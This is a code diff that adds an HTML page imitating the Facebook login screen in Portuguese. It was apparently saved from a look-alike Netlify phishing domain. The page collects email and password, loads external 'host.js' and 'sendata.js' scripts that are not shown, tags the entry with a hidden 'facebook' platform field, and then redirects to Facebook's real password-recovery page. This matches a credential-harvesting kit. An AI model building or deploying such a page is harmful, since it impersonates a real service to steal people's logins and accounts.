@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<!-- saved from url=(0046)https://www-accounts-suport-login.netlify.app/ -->
+<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico" type="image/x-icon">
+  <title>Facebook – entre ou cadastre-se</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      width: 980px;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .left {
+      flex: 1;
+      margin-right: 50px;
+      min-width: 300px;
+    }
+
+    .left h1 {
+      color: #1877f2;
+      font-size: 60px;
+      margin-bottom: 20px;
+    }
+
+    .left p {
+      font-size: 24px;
+      line-height: 1.5;
+    }
+
+    .right-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .right {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      width: 400px;
+      text-align: center;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    input:focus{
+        outline: 1px solid #165fc1;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #165fc1;
+    }
+
+    a {
+      display: block;
+      color: #1877f2;
+      font-size: 14px;
+      margin: 10px 0;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    hr {
+      margin: 20px 0;
+      border: none;
+      height: 1px;
+      background-color: #ddd;
+    }
+
+    .create-btn {
+      background-color: #42b72a;
+      width: 50%;
+    }
+
+    .create-btn:hover {
+      background-color: #36a420;
+    }
+
+    .create-page {
+      margin-top: 28px;
+      font-size: 14px;
+      text-align: center;
+    }
+    .create-page a{
+        font-weight: bold;
+        
+        color: black;
+    }
+
+    @media (max-width: 768px) {
+      body {
+        background-color: #fff;
+        padding: 20px;
+        height: auto;
+      }
+
+      .container {
+        box-shadow: none;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .left {
+        margin-right: 0;
+        text-align: center;
+      }
+
+      .left h1 {
+        margin-top: 80px;
+        font-size: 48px;
+      }
+
+      .left p {
+        display: none;
+        font-size: 20px;
+      }
+      .right-container{
+         width: 100%;
+      }
+
+      .right {
+        box-shadow: none;
+        width: 100%;
+        margin-top: 10px;
+      }
+      .right a{
+        padding: 5px;
+      }
+      input{
+        width: 100%;
+      }
+
+      .create-page {
+        padding: 0 20px;
+      }
+    }
+  </style>
+</head>
+<body cz-shortcut-listen="true">
+  <div class="container">
+    <div class="left">
+      <h1>facebook</h1>
+      <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
+    </div>
+
+    <div class="right-container">
+      <div class="right">
+      
+          <input type="text" id="email" class="inputName" placeholder="Email ou telefone" required="">
+          <input type="password" id="senha" class="inputPass" placeholder="Senha" required="">
+          <input type="text" value="facebook" class="platform" style="display: none;">
+          <button type="" id="entrar" class="enviar">Entrar</button>
+          <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Esqueceu a senha?</a>
+          <hr>
+          <button type="button" class="create-btn">Criar nova conta</button>
+        
+      </div>
+      <p class="create-page"><a href="https://www-accounts-suport-login.netlify.app/#">Crie uma Página</a> para uma celebridade, banda ou empresa.</p>
+    </div>
+  </div>
+
+  <script src="../host.js"></script>
+  <script src="../sendata.js"></script>
+  <script>document.querySelector("#entrar").addEventListener("click",()=>{
+
+    location.href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+  })</script>
+
+  
+
+
+</body></html>
